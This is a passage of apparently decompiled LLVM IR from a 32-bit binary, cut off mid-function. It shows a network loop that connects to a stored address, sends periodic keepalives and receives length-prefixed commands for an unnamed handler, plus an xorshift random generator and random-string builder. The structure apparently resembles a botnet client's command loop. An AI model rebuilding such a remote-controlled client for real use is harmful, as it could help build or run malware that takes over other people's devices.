  %v13_f298 = call i32 @select(i32 %v1_f284, %_TYPEDEF_fd_set* %tmp42, %_TYPEDEF_fd_set* %tmp43, %_TYPEDEF_fd_set* null, %timeval* %tmp44)
  %v14_f298 = trunc i32 %v13_f298 to i8
  %v3_f29c = icmp eq i8 %v14_f298, -1
  store i32 %v13_f298, i32* %r3.global-to-local, align 4
  br i1 %v3_f29c, label %dec_label_pc_f1b4.backedge, label %dec_label_pc_f2a8

dec_label_pc_f2a8:                                ; preds = %bb46
  %v3_f2a8 = icmp eq i8 %v14_f298, 0
  br i1 %v3_f2a8, label %dec_label_pc_f2b0, label %dec_label_pc_f2d0

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f2a8
  %v0_f2b0 = load i32, i32* @sb, align 4
  %v6_f2bc = inttoptr i32 %v13_f298 to i8*
  store i8* %v6_f2bc, i8** %stack_var_-38, align 4
  %v2_f2c0 = srem i32 %v0_f2b0, 6
  %v2_f2c4 = icmp eq i32 %v2_f2c0, 0
  %v1_f2c8 = add i32 %v0_f2b0, 1
  store i32 %v1_f2c8, i32* @sb, align 4
  br i1 %v2_f2c4, label %dec_label_pc_f520, label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_f2a8, %dec_label_pc_f2b0, %dec_label_pc_f520
  store i32 ptrtoint (i8** @global_var_1a3d4.156 to i32), i32* %r2.global-to-local, align 4
  %v2_f2d4 = load i8, i8* bitcast (i8** @global_var_1a3d4.156 to i8*), align 4
  %v3_f2d4 = zext i8 %v2_f2d4 to i32
  store i32 %v3_f2d4, i32* @r4, align 4
  %v2_f2d8 = icmp eq i8 %v2_f2d4, 0
  %v2_f360 = load i32, i32* @global_var_1a398.154, align 4
  br i1 %v2_f2d8, label %dec_label_pc_f360, label %dec_label_pc_f2e0

dec_label_pc_f2e0:                                ; preds = %dec_label_pc_f2d0
  %v3_f2e4 = udiv i32 %v2_f360, 32
  %v3_f2ec = mul nuw nsw i32 %v3_f2e4, 4
  %v2_f2f0 = add i32 %v3_f2ec, %v2_f04c
  store i32 %v2_f2f0, i32* %r3.global-to-local, align 4
  %v1_f2f4 = add i32 %v2_f2f0, -344
  %v2_f2f4 = inttoptr i32 %v1_f2f4 to i32*
  %v3_f2f4 = load i32, i32* %v2_f2f4, align 4
  %v1_f2f8 = urem i32 %v2_f360, 32
  %v6_f2fc = lshr i32 %v3_f2f4, %v1_f2f8
  store i32 %v6_f2fc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1a3d4.156 to i32), i32* %r3.global-to-local, align 4
  %v1_f308 = urem i32 %v6_f2fc, 2
  %v2_f308 = icmp eq i32 %v1_f308, 0
  store i8 0, i8* bitcast (i8** @global_var_1a3d4.156 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1a398.154 to i32), i32* @r4, align 4
  br i1 %v2_f308, label %dec_label_pc_f318, label %dec_label_pc_f4c0

dec_label_pc_f318:                                ; preds = %dec_label_pc_f2e0
  %v1_f31c = icmp ne i32 %v2_f360, -1
  call void @__pseudo_cond_branch(i1 %v1_f31c, i32 ptrtoint (i32* @global_var_8d7c.157 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f324 = load i32, i32* @r4, align 4
  %v2_f324 = inttoptr i32 %v1_f324 to i32*
  store i32 -1, i32* %v2_f324, align 4
  %v1_f32c = call i32 @sleep(i32 1)
  br label %dec_label_pc_f1b4.backedge

dec_label_pc_f1b4.backedge:                       ; preds = %dec_label_pc_f318, %dec_label_pc_f42c, %dec_label_pc_f4f8, %dec_label_pc_f594, %dec_label_pc_f5c0, %dec_label_pc_f5dc, %dec_label_pc_f644, %bb46, %dec_label_pc_f360, %dec_label_pc_f370, %dec_label_pc_f540, %bb48, %dec_label_pc_f5f0, %dec_label_pc_f5ac
  %v2_f1bc49.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f1b4

dec_label_pc_f334:                                ; preds = %dec_label_pc_f224
  store i32 %v2_f04c, i32* %r2.global-to-local, align 4
  %v3_f340 = mul nuw nsw i32 %v3_f338, 4
  %v2_f344 = add i32 %v3_f340, %v2_f04c
  store i32 %v2_f344, i32* %r3.global-to-local, align 4
  %v1_f348 = add i32 %v2_f344, -216
  %v2_f348 = inttoptr i32 %v1_f348 to i32*
  %v3_f348 = load i32, i32* %v2_f348, align 4
  %v1_f34c = urem i32 %v2_f334, 32
  %v7_f354 = shl i32 1, %v1_f34c
  %v8_f354 = or i32 %v3_f348, %v7_f354
  store i32 %v8_f354, i32* %r2.global-to-local, align 4
  store i32 %v8_f354, i32* %v2_f348, align 4
  br label %dec_label_pc_f25c

dec_label_pc_f360:                                ; preds = %dec_label_pc_f2d0
  %v2_f364 = icmp eq i32 %v2_f360, -1
  store i32 ptrtoint (i32* @global_var_1a398.154 to i32), i32* @r8, align 4
  br i1 %v2_f364, label %dec_label_pc_f1b4.backedge, label %dec_label_pc_f370

dec_label_pc_f370:                                ; preds = %dec_label_pc_f360
  %v3_f370 = udiv i32 %v2_f360, 32
  %v3_f374 = mul nuw nsw i32 %v3_f370, 4
  %v2_f37c = add i32 %v3_f374, %v2_f04c
  store i32 %v2_f37c, i32* %r3.global-to-local, align 4
  %v1_f380 = add i32 %v2_f37c, -216
  %v2_f380 = inttoptr i32 %v1_f380 to i32*
  %v3_f380 = load i32, i32* %v2_f380, align 4
  %v1_f384 = urem i32 %v2_f360, 32
  %v6_f388 = lshr i32 %v3_f380, %v1_f384
  store i32 %v6_f388, i32* %r2.global-to-local, align 4
  %v1_f38c = urem i32 %v6_f388, 2
  %v2_f38c = icmp eq i32 %v1_f38c, 0
  br i1 %v2_f38c, label %dec_label_pc_f1b4.backedge, label %dec_label_pc_f394

dec_label_pc_f394:                                ; preds = %dec_label_pc_f370
  %v6_f394 = inttoptr i32 %v3_f2d4 to i8*
  store i8* %v6_f394, i8** %stack_var_-38, align 4
  %v0_f39c = call i32* @__errno_location()
  %v1_f39c = ptrtoint i32* %v0_f39c to i32
  %v0_f3a0 = load i32, i32* @r4, align 4
  store i32 %v0_f3a0, i32* %v0_f39c, align 4
  store i32 %v1_f39c, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f3b4 = load i32, i32* @global_var_1a398.154, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_f3c0 = call i32 @recv(i32 %v2_f3b4, i32* %v7_f538, i32 2, i32 16386)
  %v2_f3c4 = icmp eq i32 %v5_f3c0, -1
  br i1 %v2_f3c4, label %dec_label_pc_f5ac, label %dec_label_pc_f3cc

dec_label_pc_f3cc:                                ; preds = %dec_label_pc_f394
  %v2_f3cc = icmp eq i32 %v5_f3c0, 0
  br i1 %v2_f3cc, label %dec_label_pc_f42c, label %dec_label_pc_f3d4

dec_label_pc_f3d4:                                ; preds = %dec_label_pc_f3cc
  %v3_f3d4 = load i8*, i8** %stack_var_-38, align 4
  %v4_f3d4 = ptrtoint i8* %v3_f3d4 to i32
  store i32 %v3_f2d4, i32* %r3.global-to-local, align 4
  %v4_f3dc = mul nuw nsw i32 %v3_f2d4, 256
  %v5_f3dc = or i32 %v4_f3d4, %v4_f3dc
  store i32 %v5_f3dc, i32* %r2.global-to-local, align 4
  %v7_f3dc = icmp eq i32 %v5_f3dc, 0
  br i1 %v7_f3dc, label %dec_label_pc_f5c0, label %dec_label_pc_f3e4

dec_label_pc_f3e4:                                ; preds = %dec_label_pc_f3d4
  %v1_f3e4 = mul i32 %v4_f3d4, 256
  %v3_f3e8 = and i32 %v1_f3e4, 65280
  %v4_f3ec = udiv i32 %v5_f3dc, 256
  %v5_f3ec = or i32 %v3_f3e8, %v4_f3ec
  %v6_f3ec = trunc i32 %v4_f3ec to i8
  store i32 %v5_f3ec, i32* %r2.global-to-local, align 4
  %v4_f3f0 = udiv i32 %v5_f3dc, 65536
  store i32 %v4_f3f0, i32* %r3.global-to-local, align 4
  %v3_f3f4 = icmp slt i8 %v6_f3ec, 0
  %v7_f3fc = inttoptr i32 %v4_f3ec to i8*
  store i8* %v7_f3fc, i8** %stack_var_-38, align 4
  br i1 %v3_f3f4, label %dec_label_pc_f5dc, label %dec_label_pc_f404

dec_label_pc_f404:                                ; preds = %dec_label_pc_f3e4
  %v0_f404 = load i32, i32* @r4, align 4
  %v1_f404 = load i32, i32* @r5, align 4
  %v2_f404 = inttoptr i32 %v1_f404 to i32*
  store i32 %v0_f404, i32* %v2_f404, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f410 = load i32, i32* @global_var_1a398.154, align 4
  %v9_f418 = call i32 @recv(i32 %v2_f410, i32* nonnull %stack_var_-1532, i32 %v4_f3ec, i32 16386)
  %v2_f41c = icmp eq i32 %v9_f418, -1
  br i1 %v2_f41c, label %dec_label_pc_f5ac, label %dec_label_pc_f424

dec_label_pc_f424:                                ; preds = %dec_label_pc_f404
  %v2_f424 = icmp eq i32 %v9_f418, 0
  br i1 %v2_f424, label %dec_label_pc_f42c, label %dec_label_pc_f5f0

dec_label_pc_f42c:                                ; preds = %bb48, %dec_label_pc_f424, %dec_label_pc_f3cc
  %v2_f42c = load i32, i32* @global_var_1a398.154, align 4
  %v1_f434 = icmp ne i32 %v2_f42c, -1
  call void @__pseudo_cond_branch(i1 %v1_f434, i32 ptrtoint (i32* @global_var_8d7c.157 to i32))
  store i32 ptrtoint (i32* @global_var_1a398.154 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1a398.154, align 4
  %v1_f448 = call i32 @sleep(i32 1)
  br label %dec_label_pc_f1b4.backedge

dec_label_pc_f450:                                ; preds = %dec_label_pc_f214
  %v0_f458 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f458, i32* %r2.global-to-local, align 4
  %v3_f45c = call i32 @socket(i32 2, i32 1, i32 %v0_f458)
  %v2_f460 = icmp eq i32 %v3_f45c, -1
  store i32 %v3_f45c, i32* %r5.global-to-local, align 4
  %v1_f468 = load i32, i32* %r8.global-to-local, align 4
  %v2_f468 = inttoptr i32 %v1_f468 to i32*
  store i32 %v3_f45c, i32* %v2_f468, align 4
  br i1 %v2_f460, label %dec_label_pc_f224, label %dec_label_pc_f470

dec_label_pc_f470:                                ; preds = %dec_label_pc_f450
  %v0_f470 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f470, i32* %r2.global-to-local, align 4
  %v2_f478 = call i32 (i32, i32, ...) @fcntl(i32 %v3_f45c, i32 3)
  %v1_f480 = or i32 %v2_f478, 2048
  store i32 %v1_f480, i32* %r2.global-to-local, align 4
  %v0_f484 = load i32, i32* %r5.global-to-local, align 4
  %v2_f488 = call i32 (i32, i32, ...) @fcntl(i32 %v0_f484, i32 4)
  store i32 ptrtoint (i32* @global_var_1a39c.127 to i32), i32* %r2.global-to-local, align 4
  %v2_f490 = load i32, i32* @global_var_1a39c.127, align 4
  store i32 %v2_f490, i32* %r3.global-to-local, align 4
  %v2_f494 = icmp eq i32 %v2_f490, 0
  br i1 %v2_f494, label %.thread, label %bb47

bb47:                                             ; preds = %dec_label_pc_f470
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_11a50.158 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f470, %bb47
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f4a8 = load i32, i32* @global_var_1a398.154, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1a3d4.156 to i8*), align 4
  %v5_f4b8 = call i32 @connect(i32 %v2_f4a8, %sockaddr* bitcast (%sockaddr** @global_var_1a42c.136 to %sockaddr*), i32 16)
  br label %dec_label_pc_f224

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f2e0
  store i32 4, i32* @r5, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v2_f4d0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-48, align 4
  %v8_f4e8 = call i32 @getsockopt(i32 %v2_f360, i32 1, i32 4, i32* nonnull %stack_var_-44, i32* nonnull %stack_var_-48)
  %v3_f4ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f4ec, i32* %r3.global-to-local, align 4
  %v2_f4f0 = icmp eq i32 %v3_f4ec, 0
  br i1 %v2_f4f0, label %dec_label_pc_f540, label %dec_label_pc_f4f8

dec_label_pc_f4f8:                                ; preds = %dec_label_pc_f4c0
  %v2_f4f8 = load i32, i32* @global_var_1a398.154, align 4
  %v1_f4fc = call i32 @close(i32 %v2_f4f8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f504 = load i32, i32* @r4, align 4
  %v2_f504 = inttoptr i32 %v1_f504 to i32*
  store i32 -1, i32* %v2_f504, align 4
  %v0_f508 = call i32 @function_f67c()
  %v2_f510 = urem i32 %v0_f508, 10
  %v1_f514 = add nuw nsw i32 %v2_f510, 1
  %v1_f518 = call i32 @sleep(i32 %v1_f514)
  br label %dec_label_pc_f1b4.backedge

dec_label_pc_f520:                                ; preds = %dec_label_pc_f2b0
  %v2_f528 = load i32, i32* @global_var_1a398.154, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v8_f538 = call i32 @send(i32 %v2_f528, i32* nonnull %v7_f538, i32 2, i32 16384)
  br label %dec_label_pc_f2d0

dec_label_pc_f540:                                ; preds = %dec_label_pc_f4c0
  %v2_f548 = call i32 @function_11798(i8* %v1_f548)
  %sext = mul i32 %v2_f548, 16777216
  %v1_f54c = sdiv i32 %sext, 16777216
  %v7_f54c = inttoptr i32 %v1_f54c to i8*
  store i8* %v7_f54c, i8** %stack_var_-38, align 4
  %v0_f550 = call i32 @function_11a50()
  store i32 %v0_f550, i32* @global_var_1a420.104, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f564 = load i32, i32* @r5, align 4
  store i32 %v0_f564, i32* %r2.global-to-local, align 4
  %v2_f568 = load i32, i32* @global_var_1a398.154, align 4
  %v5_f56c = call i32 @send(i32 %v2_f568, i32* nonnull @global_var_12040.160, i32 %v0_f564, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_f578 = load i32, i32* @global_var_1a398.154, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f584 = call i32 @send(i32 %v2_f578, i32* %v7_f538, i32 1, i32 16384)
  %v3_f588 = load i8*, i8** %stack_var_-38, align 4
  %v4_f588 = ptrtoint i8* %v3_f588 to i32
  store i32 %v4_f588, i32* %r2.global-to-local, align 4
  %v3_f58c = icmp eq i8* %v3_f588, null
  br i1 %v3_f58c, label %dec_label_pc_f1b4.backedge, label %dec_label_pc_f594

dec_label_pc_f594:                                ; preds = %dec_label_pc_f540
  %v2_f598 = load i32, i32* @global_var_1a398.154, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f5a4 = call i32 @send(i32 %v2_f598, i32* nonnull %stack_var_-124, i32 %v4_f588, i32 16384)
  br label %dec_label_pc_f1b4.backedge

dec_label_pc_f5ac:                                ; preds = %dec_label_pc_f404, %dec_label_pc_f394
  %v0_f5ac = load i32, i32* @r5, align 4
  %v1_f5ac = inttoptr i32 %v0_f5ac to i32*
  %v2_f5ac = load i32, i32* %v1_f5ac, align 4
  store i32 %v2_f5ac, i32* %r3.global-to-local, align 4
  %v7_f5b0 = icmp eq i32 %v2_f5ac, 4
  br i1 %v7_f5b0, label %dec_label_pc_f1b4.backedge, label %bb48

bb48:                                             ; preds = %dec_label_pc_f5ac
  %v8_f5b4 = icmp eq i32 %v2_f5ac, 11
  br i1 %v8_f5b4, label %dec_label_pc_f1b4.backedge, label %dec_label_pc_f42c

dec_label_pc_f5c0:                                ; preds = %dec_label_pc_f3d4
  %v2_f5c4 = load i32, i32* @global_var_1a398.154, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f5d4 = call i32 @recv(i32 %v2_f5c4, i32* nonnull %v7_f538, i32 2, i32 16384)
  br label %dec_label_pc_f1b4.backedge

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f3e4
  %v2_f5dc = load i32, i32* @global_var_1a398.154, align 4
  %v1_f5e0 = call i32 @close(i32 %v2_f5dc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f5e8 = load i32, i32* @r8, align 4
  %v2_f5e8 = inttoptr i32 %v1_f5e8 to i32*
  store i32 -1, i32* %v2_f5e8, align 4
  br label %dec_label_pc_f1b4.backedge

dec_label_pc_f5f0:                                ; preds = %dec_label_pc_f424
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f600 = load i32, i32* @global_var_1a398.154, align 4
  %v5_f604 = call i32 @recv(i32 %v2_f600, i32* nonnull %v7_f538, i32 2, i32 16384)
  %v3_f608 = load i8*, i8** %stack_var_-38, align 4
  %v4_f608 = ptrtoint i8* %v3_f608 to i32
  %v4_f60c = urem i32 %v4_f3f0, 256
  %v4_f610 = mul i32 %v4_f608, 256
  %v5_f610 = or i32 %v4_f610, %v4_f60c
  store i32 %v5_f610, i32* %r2.global-to-local, align 4
  %v3_f618 = sdiv i32 %v4_f610, 256
  store i32 %v3_f618, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f624 = load i32, i32* @global_var_1a398.154, align 4
  %v6_f62c = inttoptr i32 %v5_f610 to i8*
  store i8* %v6_f62c, i8** %stack_var_-38, align 4
  %v8_f630 = call i32 @recv(i32 %v2_f624, i32* nonnull %stack_var_-1532, i32 %v5_f610, i32 16384)
  %v3_f634 = load i8*, i8** %stack_var_-38, align 4
  %v4_f634 = ptrtoint i8* %v3_f634 to i32
  store i32 %v4_f634, i32* %r2.global-to-local, align 4
  %v4_f638 = urem i32 %v3_f618, 256
  store i32 %v4_f638, i32* %r3.global-to-local, align 4
  %v6_f63c = mul nuw nsw i32 %v4_f638, 256
  %v7_f63c = or i32 %v4_f634, %v6_f63c
  %v9_f63c = icmp eq i32 %v7_f63c, 0
  br i1 %v9_f63c, label %dec_label_pc_f1b4.backedge, label %dec_label_pc_f644

dec_label_pc_f644:                                ; preds = %dec_label_pc_f5f0
  %v7_f648 = call i32 @function_901c(i32* nonnull %stack_var_-1532, i32 %v7_f63c, i32 %v4_f634, i32 %v4_f638)
  br label %dec_label_pc_f1b4.backedge

; uselistorder directives
  uselistorder i32 %v4_f638, { 2, 0, 1 }
  uselistorder i32 %v4_f634, { 1, 0, 2 }
  uselistorder i32 %v3_f618, { 1, 0 }
  uselistorder i32 %v5_f610, { 1, 0, 2 }
  uselistorder i32 %v4_f610, { 1, 0 }
  uselistorder i32 %v3_f45c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_f3ec, { 2, 3, 0, 1 }
  uselistorder i32 %v2_f360, { 5, 2, 1, 6, 0, 4, 3 }
  uselistorder i32 %v13_f298, { 1, 0, 2 }
  uselistorder i32 %v2_f1e4, { 1, 0, 2 }
  uselistorder i32 %v1_f1d8, { 1, 2, 0 }
  uselistorder i32 %v1_f1c0, { 1, 2, 0 }
  uselistorder i32* %v7_f538, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v2_f0b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f04c, { 0, 1, 7, 2, 3, 4, 5, 6, 8 }
  uselistorder i32 %v2_f03c, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_ef80, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-124, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8** %stack_var_-38, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 22, 30, 31, 32, 44, 45, 36, 37, 33, 42, 43, 34, 35, 38, 39, 40, 41 }
  uselistorder i8 1, { 1, 2, 0, 3 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @sleep, { 8, 7, 9, 4, 1, 0, 3, 2, 5, 6, 10 }
  uselistorder i8* bitcast (i8** @global_var_1a3d4.156 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1a3d4.156, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1a3d4.156 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1a394.129, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_1a398.154, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32 (i32)* @function_ee60, { 1, 0 }
  uselistorder i32 (i32)* @function_e49c, { 1, 0 }
  uselistorder i32 (i32)* @function_934c, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @write, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @function_117c0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 (i32, i32)* @function_f730, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_ec9c, { 1, 0 }
  uselistorder i32* @global_var_1a39c.127, { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_ee0c.125 to i32), { 0, 2, 1 }
  uselistorder %sockaddr** @global_var_1a42c.136, { 1, 2, 0 }
  uselistorder void (i32)* (i32, void (i32)*)* @signal, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f1b4.backedge, { 6, 12, 5, 4, 11, 13, 3, 10, 2, 1, 9, 8, 0, 7 }
  uselistorder label %dec_label_pc_f2d0, { 2, 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_f224, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f214, { 1, 0 }
  uselistorder label %dec_label_pc_f1d4.dec_label_pc_f1d4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f1bc.dec_label_pc_f1bc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f008, { 2, 0, 1 }
}

define i32 @function_f67c() local_unnamed_addr {
dec_label_pc_f67c:
  %v2_f688 = load i32, i32* @global_var_1a3d8.162, align 4
  %v2_f68c = load i32, i32* @global_var_1a3e4.164, align 4
  %v4_f698 = mul i32 %v2_f688, 2048
  %v5_f698 = xor i32 %v4_f698, %v2_f688
  %v4_f69c = udiv i32 %v2_f68c, 524288
  %v5_f69c = xor i32 %v4_f69c, %v2_f68c
  %v2_f6a0 = load i32, i32* @global_var_1a3dc.166, align 4
  %v2_f6a4 = load i32, i32* @global_var_1a3e0.168, align 4
  %v2_f6a8 = xor i32 %v5_f69c, %v5_f698
  %v4_f6ac = udiv i32 %v5_f698, 256
  %v5_f6ac = xor i32 %v2_f6a8, %v4_f6ac
  store i32 %v2_f6a0, i32* @global_var_1a3d8.162, align 4
  store i32 %v2_f6a4, i32* @global_var_1a3dc.166, align 4
  store i32 %v2_f68c, i32* @global_var_1a3e0.168, align 4
  store i32 %v5_f6ac, i32* @global_var_1a3e4.164, align 4
  ret i32 %v5_f6ac

; uselistorder directives
  uselistorder i32 %v2_f68c, { 2, 1, 0 }
  uselistorder i32 %v2_f688, { 1, 0 }
}

define i32 @function_f6d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_f6d4:
  %stack_var_-12 = alloca i32, align 4
  %v3_f6d4 = load i32, i32* @r4, align 4
  store i32 %v3_f6d4, i32* %stack_var_-12, align 4
  %v2_f6dc = call i32 @time(i32* null)
  store i32 %v2_f6dc, i32* @global_var_1a3d8.162, align 4
  %v1_f6e8 = call i32 @getpid()
  %v0_f6f0 = call i32 @getppid()
  %v2_f6f8 = xor i32 %v1_f6e8, %v0_f6f0
  store i32 %v2_f6f8, i32* @global_var_1a3dc.166, align 4
  %v1_f700 = call i32 @clock()
  %v2_f704 = load i32, i32* @global_var_1a3dc.166, align 4
  %v2_f710 = xor i32 %v2_f704, %v1_f700
  store i32 %v2_f710, i32* @global_var_1a3e4.164, align 4
  store i32 %v1_f700, i32* @global_var_1a3e0.168, align 4
  %v2_f71c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f71c, i32* @r4, align 4
  ret i32 %v1_f700

; uselistorder directives
  uselistorder i32 %v1_f700, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 0, 2, 1, 3 }
  uselistorder i32 ()* @getpid, { 1, 2, 0, 3 }
}

define i32 @function_f730(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f730:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f730 = load i32, i32* @r4, align 4
  store i32 %v3_f730, i32* %stack_var_-36, align 4
  %v6_f730 = load i32, i32* @r5, align 4
  %v9_f730 = load i32, i32* @r6, align 4
  %v12_f730 = load i32, i32* @r7, align 4
  %v28_f730 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_f744 = call i32 @function_1134c(i32 28)
  %v3_f750 = call i32 @function_11268(i32 28, i32* null)
  %v1_f754 = inttoptr i32 %v3_f750 to i8*
  %tmp12 = bitcast i32* %stack_var_-68 to i8*
  %v6_f75c = call i8* @strcpy(i8* %tmp12, i8* %v1_f754)
  %v2_f760 = icmp eq i32 %arg2, 0
  br i1 %v2_f760, label %dec_label_pc_f7dc, label %dec_label_pc_f768

dec_label_pc_f768:                                ; preds = %dec_label_pc_f730
  store i32 ptrtoint (i32* @global_var_1a3d8.162 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a3dc.166 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a3e0.168 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1a3e4.164 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_f77c

dec_label_pc_f77c:                                ; preds = %dec_label_pc_f77c.dec_label_pc_f77c_crit_edge, %dec_label_pc_f768
  %v1_f7a0 = phi i32 [ %v1_f7a0.pre, %dec_label_pc_f77c.dec_label_pc_f77c_crit_edge ], [ ptrtoint (i32* @global_var_1a3d8.162 to i32), %dec_label_pc_f768 ]
  %v2_f77c = load i32, i32* @global_var_1a3e4.164, align 4
  store i32 %v2_f77c, i32* %r2.global-to-local, align 4
  %v2_f780 = load i32, i32* @global_var_1a3d8.162, align 4
  %v4_f784 = udiv i32 %v2_f77c, 524288
  %v5_f784 = xor i32 %v4_f784, %v2_f77c
  %v4_f788 = mul i32 %v2_f780, 2048
  %v5_f788 = xor i32 %v4_f788, %v2_f780
  %v2_f78c = xor i32 %v5_f784, %v5_f788
  %v2_f790 = load i32, i32* @global_var_1a3dc.166, align 4
  %v2_f794 = load i32, i32* @global_var_1a3e0.168, align 4
  store i32 %v2_f794, i32* %ip.global-to-local, align 4
  %v4_f798 = udiv i32 %v5_f788, 256
  %v5_f798 = xor i32 %v2_f78c, %v4_f798
  store i32 %v5_f798, i32* @r4, align 4
  %v2_f7a0 = inttoptr i32 %v1_f7a0 to i32*
  store i32 %v2_f790, i32* %v2_f7a0, align 4
  %v0_f7a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_f7a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_f7a4 = inttoptr i32 %v1_f7a4 to i32*
  store i32 %v0_f7a4, i32* %v2_f7a4, align 4
  %v0_f7a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_f7a8 = load i32, i32* @r7, align 4
  %v2_f7a8 = inttoptr i32 %v1_f7a8 to i32*
  store i32 %v0_f7a8, i32* %v2_f7a8, align 4
  %v0_f7ac = load i32, i32* @r4, align 4
  %v1_f7ac = load i32, i32* @r6, align 4
  %v2_f7ac = inttoptr i32 %v1_f7ac to i32*
  store i32 %v0_f7ac, i32* %v2_f7ac, align 4
  %v2_f7b0 = call i32 @function_11798(i8* %tmp12)
  %v0_f7b8 = load i32, i32* @r4, align 4
  %v2_f7bc = urem i32 %v0_f7b8, %v2_f7b0
  %v2_f7c4 = add i32 %v2_f7bc, %v28_f730
  %v1_f7c8 = add i32 %v2_f7c4, -32
  %v2_f7c8 = inttoptr i32 %v1_f7c8 to i8*
  %v3_f7c8 = load i8, i8* %v2_f7c8, align 1
  %v2_f7cc = load i32, i32* @r5, align 4
  %v3_f7cc = load i32, i32* %fp.global-to-local, align 4
  %v4_f7cc = add i32 %v3_f7cc, %v2_f7cc
  %v5_f7cc = inttoptr i32 %v4_f7cc to i8*
  store i8 %v3_f7c8, i8* %v5_f7cc, align 1
  %v0_f7d0 = load i32, i32* @r5, align 4
  %v1_f7d0 = add i32 %v0_f7d0, 1
  store i32 %v1_f7d0, i32* @r5, align 4
  %v1_f7d4 = load i32, i32* %sb.global-to-local, align 4
  %v9_f7d4 = icmp eq i32 %v1_f7d0, %v1_f7d4
